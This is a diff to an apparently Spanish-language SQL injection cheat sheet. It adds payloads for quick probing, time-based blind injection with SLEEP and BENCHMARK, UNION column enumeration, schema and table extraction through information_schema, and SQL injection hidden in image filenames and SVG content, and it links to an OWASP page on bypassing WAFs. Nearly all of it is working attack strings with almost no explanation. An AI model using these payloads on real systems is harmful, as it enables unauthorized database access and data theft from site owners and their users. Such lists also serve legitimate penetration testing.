@@ -4,6 +4,7 @@
 
 ```bash
 # Testing rapido. El 1 representa el numero o letra despues del parametro.
+' " ) # || + >
 1'
 1"
 1\
@@ -18,12 +19,20 @@
 1' ORDER BY 1#
 1'OR(1)=1# 
 1'||1=1#
-1'AND(SLEEP(5))# 
+1'AND(SLEEP(5))#
+SLEEP(5)--
+SELECT BENCHMARK(1000000,MD5('A'));
+1 OR SLEEP(25)=0 LIMIT 1--
+1) OR SLEEP(25)=0 LIMIT 1--
+1' OR SLEEP(25)=0 LIMIT 1--
+1') OR SLEEP(25)=0 LIMIT 1--
+1)) OR SLEEP(25)=0 LIMIT 1--
+SELECT SLEEP(25)--
 1%09AND%09SLEEP(5)# 
 1 AND 1 BETWEEN 1 AND 2#
-1")) OR (("1"="1--
-1') OR ('1'='1--
-1" OR "1"="1"--
+1")) OR (("1"="1 --
+1') OR ('1'='1 --
+1" OR "1"="1" --
 1' OR LENGTH(USER()) > 18 -- -
 1' OR 1=1 ORDER BY (SELECT IF(1=1, SLEEP(5), 0) FROM (SELECT 1) AS x LIMIT 1) -- -
 ```
@@ -50,9 +59,9 @@
 ```bash
 # Cambiar el numero hasta la deteccion o NULL.
 1' ORDER BY 5# 
-1' ORDER BY 5 --%20
+1' ORDER BY 5 --
 1' UNION SELECT NULL#
-1' UNION SELECT NULL --%20
+1' UNION SELECT NULL --
 1 GROUP by 10 --
 1' GROUP by 10 --
 -1' GROUP by -- -
@@ -63,10 +72,13 @@
 ```bash
 # Ejemplo para 3 columnas
 -1' UNION SELECT 'test1','test2','test3'#
--1' UNION SELECT 'test1','test2','test3'--%20
+-1' UNION SELECT 'test1','test2','test3'--
 ```
 **`⃤⃞⃟⃤`** Sintaxis de extraccion.
 ```bash
+# Tablas y columnas en una peticion separadas por '|'.
+' union select 1, CONCAT(table_name, '|', column_name), 1 from information_schema.columns where table_schema = database() --
+ 
 # Nombres de las DB para 3 columnas.
 -1' UNION SELECT schema_name, 2, 3 FROM information_schema.schemata#
 
@@ -156,21 +168,23 @@
 ```
 **`⃤⃞⃟⃤`** Payloads en nombre de imagen.
 ```bash
-imagen.jpg' AND (SELECT 1 FROM (SELECT(SLEEP(10)))x)-- -.jpg
+imagen.jpg' AND (SELECT 1 FROM (SELECT(SLEEP(10)))x) -- -.jpg
 imagen.png' AND 1=2-- -.png
-imagen.jpg' AND EXTRACTVALUE(1,CONCAT(0x7e,VERSION()))-- -.jpg
-imagen.png') AND (SELECT 5543 FROM (SELECT(SLEEP(5)))x) AND ('a'='a-- -.png
+imagen.jpg' AND EXTRACTVALUE(1,CONCAT(0x7e,VERSION())) -- -.jpg
+imagen.png') AND (SELECT 5543 FROM (SELECT(SLEEP(5)))x) AND ('a'='a -- -.png
 --sleep(15).png
-a';select+sleep(10);--z.png
+a';select+sleep(10); --z.png
 ----------------------------------------------------------------------------
 # Svg
 <svg xmlns="http://w3.org">
-  <![CDATA[' AND (SELECT 1 FROM (SELECT(SLEEP(10)))x)-- -]]>
+  <![CDATA[' AND (SELECT 1 FROM (SELECT(SLEEP(10)))x) -- -]]>
 </svg>
 
 <svg xmlns="http://w3.org">
-  <g id="-1&apos; AND (SELECT 1 FROM (SELECT(SLEEP(10)))x)-- -"></g>
+  <g id="-1&apos; AND (SELECT 1 FROM (SELECT(SLEEP(10)))x) -- -"></g>
 </svg>
 ```
+**`⃤⃞⃟⃤`** Links.
 
+(https://community.owasp.org/attacks/SQL_Injection_Bypassing_WAF)
 
